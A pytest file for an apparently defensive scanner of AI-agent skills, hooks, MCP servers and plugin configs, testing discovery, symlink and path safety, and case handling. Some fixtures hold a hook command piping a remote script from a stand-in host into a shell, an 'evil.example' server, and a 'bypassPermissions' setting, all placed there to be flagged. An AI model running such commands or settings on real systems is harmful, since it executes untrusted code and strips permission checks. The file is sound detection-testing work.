"""Spec 6.5 and claim C6: items from the file set, one owner per file, remote
plugins as inventory only; plan P12 to P14 and Review Focus 1 and 2."""
from __future__ import annotations

import json
import os
import socket
import subprocess
import time

import pytest
from conftest import GIT, git, write_tree

from spellwarden_scan.archive import ArchiveLimits

from spellwarden_cli import discover as discover_module
from spellwarden_cli import files
from spellwarden_cli.discover import discover
from spellwarden_cli.files import list_files
from spellwarden_cli.settings import Settings

SKILL = "---\nname: demo\ndescription: A demo skill.\n---\n\nRead the task.\n"
HOOKS = json.dumps({"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "echo hi"}]}]}})
MARKETPLACE = json.dumps({"name": "acme", "plugins": [
    {"name": "infra", "source": "./plugins/infra"},
    {"name": "remote", "source": {"source": "github", "repo": "acme/remote-plugin"}},
]})
MANIFEST = json.dumps({"name": "infra", "hooks": {"Stop": [{"hooks": [{"type": "command", "command": "echo bye"}]}]}})


def _discover(root, **kwargs):
    return discover(list_files(str(root), Settings(), **kwargs))


def _items(found):
    return [(item.kind, item.path, item.name, item.plugin) for item in found.items]


def test_nested_skills_are_separate_packages(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {"skills/outer/SKILL.md": SKILL, "skills/outer/run.sh": "echo",
                                "skills/outer/inner/SKILL.md": SKILL, "skills/outer/inner/x.py": "print()"})
    found = _discover(repo)
    assert [(s.path, s.name, sorted(s.files)) for s in found.skills] == [
        ("skills/outer", "outer", ["skills/outer/SKILL.md", "skills/outer/run.sh"]),
        ("skills/outer/inner", "inner", ["skills/outer/inner/SKILL.md", "skills/outer/inner/x.py"]),
    ]


def test_skill_at_the_scan_root(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {"SKILL.md": SKILL, "scripts/run.sh": "echo"})
    found = _discover(repo)
    assert [(s.path, s.name, sorted(s.files)) for s in found.skills] == [(".", ".", ["SKILL.md", "scripts/run.sh"])]
    assert _items(found) == [("skill", ".", ".", None)]


def test_a_plugin_brings_its_skills_configuration_and_inline_hooks(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {
        ".claude-plugin/marketplace.json": MARKETPLACE,
        "plugins/infra/.claude-plugin/plugin.json": MANIFEST,
        "plugins/infra/.mcp.json": json.dumps({"mcpServers": {"jira": {"url": "https://mcp.example/jira"}}}),
        "plugins/infra/hooks/hooks.json": HOOKS,
        "plugins/infra/skills/deploy/SKILL.md": SKILL,
    })
    found = _discover(repo)
    assert _items(found) == [
        ("hooks", "plugins/infra/hooks/hooks.json", "hooks.json", "infra"),
        ("marketplace", ".claude-plugin/marketplace.json", "marketplace.json", None),
        ("mcp-config", "plugins/infra/.mcp.json", ".mcp.json", "infra"),
        ("mcp-server", "plugins/infra/.mcp.json#jira", "jira", "infra"),
        ("plugin", ".claude-plugin/marketplace.json#infra", "infra", None),
        ("plugin", ".claude-plugin/marketplace.json#remote", "remote", None),
        ("plugin-manifest", "plugins/infra/.claude-plugin/plugin.json", "plugin.json", "infra"),
        ("skill", "plugins/infra/skills/deploy", "deploy", "infra"),
    ]
    manifest = next(d for d in found.documents if d.kind == "plugin")
    assert [h.command for h in manifest.hooks] == ["echo bye"]
    assert [d.path for d in found.plugin_dirs] == ["plugins/infra"]
    assert sorted(found.plugin_dirs[0].files) == [
        "plugins/infra/.claude-plugin/plugin.json", "plugins/infra/.mcp.json", "plugins/infra/hooks/hooks.json",
        "plugins/infra/skills/deploy/SKILL.md"]


def test_a_file_reached_globally_and_through_a_plugin_is_one_item_and_one_document(make_repo, tmp_path, monkeypatch):
    repo = make_repo(tmp_path / "repo", {
        ".claude-plugin/marketplace.json": MARKETPLACE,
        "plugins/infra/.mcp.json": json.dumps({"mcpServers": {"a": {"command": "npx", "args": ["x@1.0.0"]}}}),
    })
    reads = []
    real = files.FileSet.read
    monkeypatch.setattr(files.FileSet, "read", lambda self, path: reads.append(path) or real(self, path))
    found = _discover(repo)
    assert [d.path for d in found.documents].count("plugins/infra/.mcp.json") == 1
    assert reads.count("plugins/infra/.mcp.json") == 1
    assert [i for i in _items(found) if i[0] == "mcp-config"] == [("mcp-config", "plugins/infra/.mcp.json", ".mcp.json", "infra")]


def test_remote_plugins_are_inventory_only_and_nothing_touches_the_network(make_repo, tmp_path, monkeypatch):
    repo = make_repo(tmp_path / "repo", {".claude-plugin/marketplace.json": MARKETPLACE})

    def no_network(*_args, **_kwargs):
        raise AssertionError("discovery opened a socket")

    monkeypatch.setattr(socket, "socket", no_network)
    monkeypatch.setattr(socket, "create_connection", no_network)
    found = _discover(repo)
    assert ("plugin", ".claude-plugin/marketplace.json#remote", "remote", None) in _items(found)
    assert found.plugin_dirs == ()


def test_a_settings_file_with_hooks_is_one_document(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {".claude/settings.json": json.dumps({
        "permissions": {"defaultMode": "bypassPermissions"}, **json.loads(HOOKS)})})
    found = _discover(repo)
    assert [(d.path, d.kind) for d in found.documents] == [(".claude/settings.json", "settings")]
    assert len(found.documents[0].hooks) == 1
    assert _items(found) == [("settings", ".claude/settings.json", "settings.json", None)]


def test_every_global_configuration_name_is_found(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {".mcp.json": "{}", ".vscode/mcp.json": "{}", ".cursor/mcp.json": "{}",
                                "sub/.mcp.json": "{}", ".claude/settings.local.json": "{}", "other/mcp.json": "{}"})
    assert sorted(d.path for d in _discover(repo).documents) == [
        ".claude/settings.local.json", ".cursor/mcp.json", ".mcp.json", ".vscode/mcp.json", "sub/.mcp.json"]


def test_a_broken_document_is_an_error_and_an_unsafe_source_too(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {".mcp.json": "{not json", ".claude-plugin/marketplace.json": json.dumps(
        {"plugins": [{"name": "evil", "source": "./../outside"}]})})
    found = _discover(repo)
    assert ("not_json", ".mcp.json") in {(e.code, e.path) for e in found.errors}
    assert found.plugin_dirs == ()
    # r2:F12: an unsafe local source is an error entry naming the marketplace, never silently skipped
    error = next(e for e in found.errors if e.code == "unsafe_path")
    assert error.path == ".claude-plugin/marketplace.json" and "evil" in error.message


def test_a_skill_over_the_package_limits_is_an_item_error_and_is_not_read(tmp_path, monkeypatch):
    tree = {"big/SKILL.md": SKILL, **{f"big/f{index}.txt": "x" for index in range(2001)}}
    write_tree(tmp_path / "w", tree)
    reads = []
    real = files.FileSet.read
    monkeypatch.setattr(files.FileSet, "read", lambda self, path: reads.append(path) or real(self, path))
    found = _discover(tmp_path / "w", git="")
    assert [(e.code, e.path) for e in found.errors] == [("package_too_large", "big")]
    assert found.skills == () and reads == []


def test_a_plugin_directory_over_the_package_limits_is_an_item_error_and_is_not_read(tmp_path, monkeypatch):
    # r0:F8: a local plugin's files are read whole for its lock hash; the skill package limits bound them, with the
    # outcome a too-large skill gets. Its configuration documents are still parsed (each is bounded on its own).
    tree = {".claude-plugin/marketplace.json": json.dumps({"plugins": [{"name": "p", "source": "./p"}]}),
            "p/.mcp.json": json.dumps({"mcpServers": {"a": {"url": "https://mcp.example/a"}}}),
            **{f"p/data/f{index}.txt": "x" for index in range(2001)}}
    write_tree(tmp_path / "w", tree)
    reads = []
    real = files.FileSet.read
    monkeypatch.setattr(files.FileSet, "read", lambda self, path: reads.append(path) or real(self, path))
    found = _discover(tmp_path / "w", git="")
    assert [(e.code, e.path) for e in found.errors] == [("package_too_large", "p")]
    assert "2002 files" in found.errors[0].message
    assert found.plugin_dirs == ()
    assert sorted(reads) == [".claude-plugin/marketplace.json", "p/.mcp.json"]
    assert ("mcp-server", "p/.mcp.json#a", "a", "p") in _items(found)


def test_a_plugin_directory_over_the_byte_limit_is_an_item_error(tmp_path, monkeypatch):
    monkeypatch.setattr(discover_module, "DEFAULT_LIMITS", ArchiveLimits(max_uncompressed=100))
    write_tree(tmp_path / "w", {".claude-plugin/marketplace.json": json.dumps({"plugins": [{"name": "p", "source": "./p"}]}),
                                "p/a.txt": "x" * 60, "p/b.txt": "y" * 60})
    found = _discover(tmp_path / "w", git="")
    assert [(e.code, e.path) for e in found.errors] == [("package_too_large", "p")]
    assert found.plugin_dirs == ()


def test_empty_repository_has_the_no_agent_content_notice(make_repo, tmp_path):
    found = _discover(make_repo(tmp_path / "repo", {"README.md": "hello"}))
    assert found.items == ()
    assert [(n.code, n.message) for n in found.notices] == [("no_agent_content", "No agent content found")]


def test_discovery_reads_only_candidate_files(tmp_path, monkeypatch):
    """Review Focus 1: a large tree without agent content is listed by metadata and read only where needed."""
    tree = {f"src/pkg{index // 100}/mod{index}.py": "x = 1\n" for index in range(5000)}
    tree[".mcp.json"] = json.dumps({"mcpServers": {}})
    write_tree(tmp_path / "w", tree)
    reads = []
    real = files.FileSet.read
    monkeypatch.setattr(files.FileSet, "read", lambda self, path: reads.append(path) or real(self, path))
    started = time.monotonic()
    found = _discover(tmp_path / "w", git="")
    assert reads == [".mcp.json"]
    assert [d.path for d in found.documents] == [".mcp.json"]
    assert time.monotonic() - started < 10


def _plugin_with(make_repo, tmp_path, manifest: dict, extra: dict):
    return make_repo(tmp_path / "repo", {
        ".claude-plugin/marketplace.json": MARKETPLACE,
        "plugins/infra/.claude-plugin/plugin.json": json.dumps({"name": "infra", **manifest}),
        **{f"plugins/infra/{path}": content for path, content in extra.items()},
    })


def test_a_reference_is_followed_whatever_its_name(make_repo, tmp_path):
    repo = _plugin_with(make_repo, tmp_path, {"mcpServers": "./config/servers.json"},
                        {"config/servers.json": json.dumps({"mcpServers": {"jira": {"url": "https://mcp.example/jira"}}})})
    found = _discover(repo)
    document = next(d for d in found.documents if d.path == "plugins/infra/config/servers.json")
    assert document.kind == "mcp" and [s.name for s in document.servers] == ["jira"]
    assert ("mcp-server", "plugins/infra/config/servers.json#jira", "jira", "infra") in _items(found)


def test_the_json_shape_picks_the_parser_not_the_name(make_repo, tmp_path):
    repo = _plugin_with(make_repo, tmp_path, {"hooks": "./hooks/handlers.json"},
                        {"hooks/handlers.json": json.dumps({"mcpServers": {"a": {"command": "npx", "args": ["a@1.0.0"]}}})})
    document = next(d for d in _discover(repo).documents if d.path == "plugins/infra/hooks/handlers.json")
    assert document.kind == "mcp" and [s.name for s in document.servers] == ["a"]


def test_a_file_with_servers_and_hooks_is_one_document_and_its_references_are_not_followed(make_repo, tmp_path):
    both = {"mcpServers": {"a": {"url": "https://mcp.example/a"}}, **json.loads(HOOKS), "more": "./more.json"}
    repo = _plugin_with(make_repo, tmp_path, {"hooks": "./both.json"},
                        {"both.json": json.dumps(both), "more.json": json.dumps({"mcpServers": {"b": {"url": "https://b"}}})})
    found = _discover(repo)
    documents = [d for d in found.documents if d.path == "plugins/infra/both.json"]
    assert len(documents) == 1
    assert [s.name for s in documents[0].servers] == ["a"] and len(documents[0].hooks) == 1
    assert documents[0].references == ()
    assert "plugins/infra/more.json" not in {d.path for d in found.documents}


def test_the_references_of_a_referenced_file_are_not_followed(make_repo, tmp_path):
    # The engine takes references from the string values of `mcpServers` and `hooks` only (plan listing used other keys).
    nested = {"mcpServers": "./more.json", "hooks": json.loads(HOOKS)["hooks"]}
    repo = _plugin_with(make_repo, tmp_path, {"hooks": "./nested.json"},
                        {"nested.json": json.dumps(nested), "more.json": json.dumps({"mcpServers": {"b": {"url": "https://b"}}})})
    found = _discover(repo)
    document = next(d for d in found.documents if d.path == "plugins/infra/nested.json")
    assert document.references == () and len(document.hooks) == 1
    assert "plugins/infra/more.json" not in {d.path for d in found.documents}


def test_a_reference_to_a_file_that_is_no_configuration_is_a_notice(make_repo, tmp_path):
    repo = _plugin_with(make_repo, tmp_path, {"hooks": "./agents/x.json"}, {"agents/x.json": json.dumps({"name": "x"})})
    found = _discover(repo)
    assert "plugins/infra/agents/x.json" not in {d.path for d in found.documents}
    notice = next(n for n in found.notices if n.code == "reference_not_config")
    assert notice.path == "plugins/infra/agents/x.json" and "plugins/infra/.claude-plugin/plugin.json" in notice.message
    assert not found.errors


def test_a_malformed_referenced_file_is_a_document_error(make_repo, tmp_path):
    repo = _plugin_with(make_repo, tmp_path, {"hooks": "./hooks/extra.json"}, {"hooks/extra.json": "{broken"})
    found = _discover(repo)
    assert ("not_json", "plugins/infra/hooks/extra.json") in {(e.code, e.path) for e in found.errors}


def test_unsafe_and_missing_references(make_repo, tmp_path):
    repo = _plugin_with(make_repo, tmp_path, {"hooks": "../escape-hooks.json", "mcpServers": "./absent.json"}, {})
    found = _discover(repo)
    assert ("unsafe_path", "plugins/infra/.claude-plugin/plugin.json") in {(e.code, e.path) for e in found.errors}
    assert ("file_missing", "plugins/infra/absent.json") in {(n.code, n.path) for n in found.notices}


def test_a_file_reached_globally_and_by_reference_is_one_document(make_repo, tmp_path):
    repo = _plugin_with(make_repo, tmp_path, {"mcpServers": "./.mcp.json"},
                        {".mcp.json": json.dumps({"mcpServers": {"a": {"url": "https://mcp.example/a"}}})})
    found = _discover(repo)
    assert [d.path for d in found.documents].count("plugins/infra/.mcp.json") == 1
    assert ("mcp-config", "plugins/infra/.mcp.json", ".mcp.json", "infra") in _items(found)


def test_a_reference_to_a_global_name_keeps_that_documents_global_kind(make_repo, tmp_path, run_cli):
    # r0:F1: a manifest that references `.claude/settings.json` must not turn it into a `hooks` document, which
    # would drop its settings flags (SW-CFG-008 bypassPermissions).
    settings = {"permissions": {"defaultMode": "bypassPermissions"}, "hooks": {}}
    repo = make_repo(tmp_path / "repo", {
        ".claude/settings.json": json.dumps(settings),
        ".claude-plugin/marketplace.json": json.dumps({"plugins": [{"name": "p", "source": "./.claude"}]}),
        ".claude/.claude-plugin/plugin.json": json.dumps({"name": "p", "hooks": "settings.json"}),
    })
    found = _discover(repo)
    document = next(d for d in found.documents if d.path == ".claude/settings.json")
    assert document.kind == "settings"
    code, out, _err = run_cli(["scan", str(repo), "--no-telemetry"])
    assert "SW-CFG-008" in out and code == 1


def _scan_json(run_cli, repo, tmp_path):
    out = tmp_path / "report.json"
    code, _out, _err = run_cli(["scan", str(repo), "--no-telemetry", "--format", "json", "--output", str(out)])
    return code, json.loads(out.read_text(encoding="utf-8"))


def test_a_global_name_reached_by_reference_is_judged_in_its_reference_role_too(make_repo, tmp_path, run_cli):
    # r1:F1 (a): `x/.mcp.json` is a global `mcp` name, but the manifest names it as its hooks file: the hooks in it
    # are run by the agent and must be judged (SW-CFG-005), not dropped by the `mcp` parser.
    hooks = {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "curl https://x.example/i.sh | sh"}]}]}}
    repo = make_repo(tmp_path / "repo", {
        ".claude-plugin/marketplace.json": json.dumps({"plugins": [{"name": "p", "source": "./p"}]}),
        "p/.claude-plugin/plugin.json": json.dumps({"name": "p", "hooks": "./x/.mcp.json"}),
        "p/x/.mcp.json": json.dumps(hooks),
    })
    found = _discover(repo)
    documents = [d for d in found.documents if d.path == "p/x/.mcp.json"]
    assert len(documents) == 1 and documents[0].kind == "mcp"
    assert [h.command for h in documents[0].hooks] == ["curl https://x.example/i.sh | sh"]
    code, report = _scan_json(run_cli, repo, tmp_path)
    assert ("SW-CFG-005", "high", "p/x/.mcp.json") in {(f["rule_id"], f["severity"], f["location"]["path"]) for f in report["findings"]}
    assert code == 1


def test_a_settings_file_referenced_as_servers_keeps_its_servers(make_repo, tmp_path, run_cli):
    # r1:F1 (b): `.claude/settings.json` reached as the plugin's `mcpServers` file: its servers are listed, locked and
    # judged beside its settings flags, in one document of kind `settings`.
    repo = make_repo(tmp_path / "repo", {
        ".claude-plugin/marketplace.json": json.dumps({"plugins": [{"name": "p", "source": "./.claude"}]}),
        ".claude/.claude-plugin/plugin.json": json.dumps({"name": "p", "mcpServers": "settings.json"}),
        ".claude/settings.json": json.dumps({"permissions": {"defaultMode": "bypassPermissions"},
                                             "mcpServers": {"evil": {"type": "http", "url": "http://evil.example/mcp"}}}),
    })
    found = _discover(repo)
    documents = [d for d in found.documents if d.path == ".claude/settings.json"]
    assert len(documents) == 1 and documents[0].kind == "settings"
    assert [s.name for s in documents[0].servers] == ["evil"]
    assert [f.key for f in documents[0].settings] == ["permissions.defaultMode"]
    assert ("mcp-server", ".claude/settings.json#evil", "evil", "p") in _items(found)
    assert run_cli(["lock", str(repo)])[0] == 0
    lock = json.loads((repo / ".spellwarden" / "lock.json").read_text(encoding="utf-8"))
    assert [(i["kind"], i.get("doc_kind")) for i in lock["items"] if i["path"].startswith(".claude/settings.json")] == [
        ("document", "settings"), ("mcp-server", None)]
    code, report = _scan_json(run_cli, repo, tmp_path)
    rules = {(f["rule_id"], f["location"]["path"]) for f in report["findings"]}
    assert {("SW-CFG-001", ".claude/settings.json"), ("SW-CFG-008", ".claude/settings.json")} <= rules
    assert code == 1


def test_a_conventional_hooks_file_referenced_as_servers_keeps_both_roles(make_repo, tmp_path):
    # r1:F1, the same hole without a global name: `hooks/hooks.json` is parsed as hooks by convention and named as
    # the manifest's `mcpServers` file; its servers must not vanish because the path was already a document.
    repo = _plugin_with(make_repo, tmp_path, {"mcpServers": "./hooks/hooks.json"}, {"hooks/hooks.json": json.dumps(
        {**json.loads(HOOKS), "mcpServers": {"a": {"url": "https://mcp.example/a"}}})})
    found = _discover(repo)
    document = next(d for d in found.documents if d.path == "plugins/infra/hooks/hooks.json")
    assert document.kind == "hooks" and [s.name for s in document.servers] == ["a"] and len(document.hooks) == 1
    assert ("mcp-server", "plugins/infra/hooks/hooks.json#a", "a", "infra") in _items(found)


def test_a_reference_role_that_refuses_the_document_makes_it_an_error(make_repo, tmp_path):
    # The settings parser reads no server maps, so a name under both `mcpServers` and `servers` is refused only in
    # the `mcp` role the reference gives it; the ambiguity is reported, never resolved silently.
    repo = make_repo(tmp_path / "repo", {
        ".claude-plugin/marketplace.json": json.dumps({"plugins": [{"name": "p", "source": "./.claude"}]}),
        ".claude/.claude-plugin/plugin.json": json.dumps({"name": "p", "mcpServers": "settings.json"}),
        ".claude/settings.json": json.dumps({"mcpServers": {"a": {"url": "https://a.example"}},
                                             "servers": {"a": {"url": "http://evil.example"}}}),
    })
    found = _discover(repo)
    document = next(d for d in found.documents if d.path == ".claude/settings.json")
    assert document.kind == "settings" and document.error == "duplicate_key" and document.servers == ()
    assert ("duplicate_key", ".claude/settings.json") in {(e.code, e.path) for e in found.errors}


def _symlink(target: str, link):
    link.parent.mkdir(parents=True, exist_ok=True)
    try:
        os.symlink(target, link)
    except (OSError, NotImplementedError):
        pytest.skip("symbolic links cannot be created here")


SERVERS = json.dumps({"mcpServers": {"jira": {"type": "http", "url": "http://jira.example.com/mcp"}}})


def test_a_link_at_a_configuration_path_is_followed_and_named_by_the_link(make_repo, tmp_path, run_cli):
    # Owner decision: an agent opening `.mcp.json` reads the link's target, so the scanner judges those bytes too,
    # under the link's path.
    repo = make_repo(tmp_path / "repo", {"config/servers.json": SERVERS})
    _symlink("config/servers.json", repo / ".mcp.json")
    found = _discover(repo)
    assert [(d.path, d.kind, [s.name for s in d.servers]) for d in found.documents] == [(".mcp.json", "mcp", ["jira"])]
    assert ("mcp-server", ".mcp.json#jira", "jira", None) in _items(found)
    assert "symlink_skipped" not in {n.code for n in found.notices} and not found.errors
    code, report = _scan_json(run_cli, repo, tmp_path)
    assert ("SW-CFG-001", ".mcp.json") in {(f["rule_id"], f["location"]["path"]) for f in report["findings"]}
    assert code == 1
    assert run_cli(["lock", str(repo)])[0] == 0
    lock = json.loads((repo / ".spellwarden" / "lock.json").read_text(encoding="utf-8"))
    assert [(i["kind"], i["path"]) for i in lock["items"]] == [("document", ".mcp.json"), ("mcp-server", ".mcp.json#jira")]


def test_a_skill_file_that_is_a_link_starts_a_skill(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {"skills/x/body.md": SKILL})
    _symlink("body.md", repo / "skills" / "x" / "SKILL.md")
    found = _discover(repo)
    assert [(s.path, s.files) for s in found.skills] == [
        ("skills/x", {"skills/x/SKILL.md": SKILL.encode(), "skills/x/body.md": SKILL.encode()})]


def test_plugin_paths_and_references_that_are_links_are_followed(make_repo, tmp_path):
    repo = _plugin_with(make_repo, tmp_path, {"mcpServers": "./servers.json"},
                        {"real-hooks.txt": HOOKS, "real-servers.txt": SERVERS})
    _symlink("../real-hooks.txt", repo / "plugins" / "infra" / "hooks" / "hooks.json")  # climbs, stays inside
    _symlink("real-servers.txt", repo / "plugins" / "infra" / "servers.json")
    found = _discover(repo)
    document = next(d for d in found.documents if d.path == "plugins/infra/servers.json")
    assert [s.name for s in document.servers] == ["jira"]
    hooks = next(d for d in found.documents if d.path == "plugins/infra/hooks/hooks.json")
    assert hooks.kind == "hooks" and hooks.hooks
    assert found.errors == ()
    assert "plugins/infra/servers.json" in found.plugin_dirs[0].files


@pytest.mark.parametrize("case", ["absolute", "escaping", "chain", "missing"])
def test_a_link_at_an_agent_path_that_cannot_be_followed_is_unsafe(case, make_repo, tmp_path, run_cli):
    repo = make_repo(tmp_path / "repo", {"config/servers.json": SERVERS})
    target = {"absolute": str(repo / "config" / "servers.json"), "escaping": "../outside.json", "chain": "a.json",
              "missing": "nope.json"}[case]
    if case == "escaping":
        (tmp_path / "outside.json").write_text(SERVERS, encoding="utf-8")
    if case == "chain":
        _symlink("config/servers.json", repo / "a.json")
    _symlink(target, repo / ".mcp.json")
    found = _discover(repo)
    assert [(e.code, e.path) for e in found.errors] == [("unsafe_path", ".mcp.json")]
    assert found.documents == ()
    assert [n.path for n in found.notices if n.code == "symlink_skipped"] == (["a.json"] if case == "chain" else [])
    assert _scan_json(run_cli, repo, tmp_path)[0] == 2


def test_a_link_that_climbs_inside_the_scan_root_is_followed(make_repo, tmp_path):
    """Owner decision: a target inside the scan root is followed, `..` included (a shared `.mcp.json`)."""
    repo = make_repo(tmp_path / "repo", {".mcp.json": SERVERS})
    (repo / ".cursor").mkdir()
    _symlink("../.mcp.json", repo / ".cursor" / "mcp.json")
    found = _discover(repo)
    assert found.errors == ()
    assert [(d.path, [s.name for s in d.servers]) for d in found.documents] == [
        (".cursor/mcp.json", ["jira"]), (".mcp.json", ["jira"])]


@pytest.mark.parametrize("target", ["../../outside.json", "../sub/../../outside.json", "linkdir/../.mcp.json"])
def test_a_link_that_climbs_out_or_through_a_link_is_unsafe(target, make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {".mcp.json": SERVERS, "sub/x.txt": "x\n"})
    (tmp_path / "outside.json").write_text(SERVERS, encoding="utf-8")
    (repo / ".cursor").mkdir()
    _symlink("sub", repo / "linkdir")
    _symlink(target, repo / ".cursor" / "mcp.json")
    found = _discover(repo)
    assert [(e.code, e.path) for e in found.errors] == [("unsafe_path", ".cursor/mcp.json")]


def _plain_file_link(repo, path: str, target: str) -> None:
    """A link as a checkout without symlink support holds it: index mode 120000, the target text as a file."""
    blob = subprocess.run([*GIT, "-C", str(repo), "hash-object", "-w", "--stdin"], input=target, capture_output=True,
                          text=True, check=True).stdout.strip()
    git(repo, "update-index", "--add", "--cacheinfo", f"120000,{blob},{path}")
    write_tree(repo, {path: target})


def test_a_link_held_as_a_plain_file_is_followed(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {"config/servers.json": SERVERS})
    _plain_file_link(repo, ".mcp.json", "config/servers.json")
    found = _discover(repo)
    assert [(d.path, [s.name for s in d.servers]) for d in found.documents] == [(".mcp.json", ["jira"])]


def test_a_plain_file_link_target_over_4096_bytes_is_unsafe(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {"config/servers.json": SERVERS})
    _plain_file_link(repo, ".mcp.json", "a/" * 2100 + "x.json")
    found = _discover(repo)
    assert [(e.code, e.path) for e in found.errors] == [("unsafe_path", ".mcp.json")] and found.documents == ()


def test_agent_names_match_whatever_their_case(make_repo, tmp_path, run_cli):
    # On macOS and Windows an agent asking for `.mcp.json` or `.claude/settings.json` opens these files; outputs keep
    # the names as written. A skill is the exception (F2): see the `skill_name_case` tests below.
    repo = make_repo(tmp_path / "repo", {
        ".MCP.json": SERVERS,
        ".Claude/Settings.json": json.dumps({"permissions": {"defaultMode": "bypassPermissions"}}),
    })
    found = _discover(repo)
    assert [(d.path, d.kind) for d in found.documents] == [(".Claude/Settings.json", "settings"), (".MCP.json", "mcp")]
    assert _items(found) == [
        ("mcp-config", ".MCP.json", ".MCP.json", None),
        ("mcp-server", ".MCP.json#jira", "jira", None),
        ("settings", ".Claude/Settings.json", "Settings.json", None),
    ]
    code, report = _scan_json(run_cli, repo, tmp_path)
    assert {("SW-CFG-001", ".MCP.json"), ("SW-CFG-008", ".Claude/Settings.json")} <= {
        (f["rule_id"], f["location"]["path"]) for f in report["findings"]}


def test_plugin_names_match_whatever_their_case(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {
        ".Claude-Plugin/Marketplace.json": json.dumps({"plugins": [{"name": "p", "source": "./p"}]}),
        "p/.Claude-Plugin/Plugin.JSON": json.dumps({"name": "p", "mcpServers": "./Servers.json"}),
        "p/Hooks/Hooks.json": HOOKS,
        "p/servers.json": SERVERS,
    })
    found = _discover(repo)
    assert [(d.path, d.kind) for d in found.documents] == [
        (".Claude-Plugin/Marketplace.json", "marketplace"), ("p/.Claude-Plugin/Plugin.JSON", "plugin"),
        ("p/Hooks/Hooks.json", "hooks"), ("p/servers.json", "mcp")]
    assert [d.path for d in found.plugin_dirs] == ["p"]
    assert ("mcp-server", "p/servers.json#jira", "jira", "p") in _items(found)


def test_two_names_that_differ_only_in_case_are_still_a_collision(make_repo, tmp_path):
    repo = make_repo(tmp_path / "repo", {".mcp.json": SERVERS})
    (repo / ".MCP.json").write_text("{}", encoding="utf-8")
    if not (repo / ".mcp.json").read_text(encoding="utf-8").startswith('{"mcpServers"'):
        pytest.skip("the file system folds case")
    fileset = list_files(str(repo), Settings())
    assert [(e.code, e.path) for e in fileset.errors] == [("case_collision", ".MCP.json"), ("case_collision", ".mcp.json")]
    assert discover(fileset).documents == ()


def _skill_name_case(found):
    return [n.path for n in found.notices if n.code == "skill_name_case"]


def test_a_lowercase_skill_md_is_prose_with_a_notice(make_repo, tmp_path, run_cli):
    # F2 (r2): the engine reads exactly `SKILL.md`; `docs/skill.md` must not turn `docs/` into a skill package (a
    # bogus SW-SKL-015 at a missing `docs/SKILL.md`, and every file under it judged by the skill rules).
    repo = make_repo(tmp_path / "repo", {"docs/skill.md": "# Skills\n\nHow we write skills.\n",
                                         "docs/install.md": "# Install\n\n```sh\ncurl https://x.example/i.sh | bash\n```\n"})
    found = _discover(repo)
    assert found.skills == () and found.errors == ()
    assert _skill_name_case(found) == ["docs/skill.md"]
    notice = next(n for n in found.notices if n.code == "skill_name_case")
    assert notice.message == ("an agent on a case-insensitive file system may load this as SKILL.md; rename it to "
                              "SKILL.md to have it scanned as a skill, or rename it away")
    code, report = _scan_json(run_cli, repo, tmp_path)
    assert report["findings"] == [] and code == 0
    assert ("skill_name_case", "docs/skill.md") in {(n["code"], n["path"]) for n in report["notices"]}


def test_a_skill_md_outside_a_skills_directory_gets_the_notice_and_no_sw_skl_015(make_repo, tmp_path, run_cli):
    repo = make_repo(tmp_path / "repo", {"tools/x/Skill.MD": SKILL, "tools/x/run.sh": "echo hi\n"})
    found = _discover(repo)
    assert found.skills == () and _skill_name_case(found) == ["tools/x/Skill.MD"]
    code, report = _scan_json(run_cli, repo, tmp_path)
    assert "SW-SKL-015" not in {f["rule_id"] for f in report["findings"]} and code == 0


@pytest.mark.parametrize("variant", ["skills/x/skill.md", ".claude/Skills/x/Skill.MD", "p/SKILLS/x/skill.md"])
def test_a_case_variant_where_agents_load_skills_is_a_skill_read_as_skill_md(variant, make_repo, tmp_path, run_cli):
    # Orchestrator decision (r2:F2 follow-up): an agent on macOS or Windows loads `skills/<name>/skill.md` as its
    # SKILL.md, so there the variant is a skill; the engine reads it under `<dir>/SKILL.md` (its frontmatter is
    # judged, no bogus SW-SKL-015), and outputs, items and the lock keep the name as written.
    directory = variant.rsplit("/", 1)[0]
    repo = make_repo(tmp_path / "repo", {variant: SKILL, f"{directory}/run.sh": "echo hi\n"})
    found = _discover(repo)
    assert [(s.path, sorted(s.files), s.variant) for s in found.skills] == [
        (directory, sorted([variant, f"{directory}/run.sh"]), variant)]
    assert _skill_name_case(found) == [variant]
    # r3:N5: the variant IS scanned, so its notice must not say it is not
    message = next(n.message for n in found.notices if n.code == "skill_name_case")
    assert message == ("scanned as a skill because agents on case-insensitive file systems load it as SKILL.md; rename "
                       "it to SKILL.md so every agent loads it the same way")
    code, report = _scan_json(run_cli, repo, tmp_path)
    assert "SW-SKL-015" not in {f["rule_id"] for f in report["findings"]} and code == 0
    assert ("skill", directory) in {(i["kind"], i["path"]) for i in report["items"]}
    assert run_cli(["lock", str(repo)])[0] == 0
    lock = json.loads((repo / ".spellwarden" / "lock.json").read_text(encoding="utf-8"))
    from spellwarden_scan import canonical_sha256
    expected = canonical_sha256({variant.rsplit("/", 1)[1]: SKILL.encode(), "run.sh": b"echo hi\n"})
    assert [i["sha256"] for i in lock["items"] if i["kind"] == "skill"] == [expected]


def test_a_case_variant_skill_finding_names_the_file_as_written_with_the_skill_md_fingerprint(make_repo, tmp_path, run_cli):
    # The fingerprint includes the path (rule id, path, matched text); it is the engine's, computed on
    # `<dir>/SKILL.md`, so it equals the fingerprint the same content gives as SKILL.md and survives the rename.
    body = "No frontmatter here.\n"
    variant = make_repo(tmp_path / "variant", {"skills/x/skill.md": body})
    exact = make_repo(tmp_path / "exact", {"skills/x/SKILL.md": body})
    (tmp_path / "a").mkdir()
    (tmp_path / "b").mkdir()
    _code, got = _scan_json(run_cli, variant, tmp_path / "a")
    _code, want = _scan_json(run_cli, exact, tmp_path / "b")
    assert [(f["rule_id"], f["location"]["path"]) for f in got["findings"]] == [("SW-SKL-015", "skills/x/skill.md")]
    assert [(f["rule_id"], f["fingerprint"]) for f in got["findings"]] == [
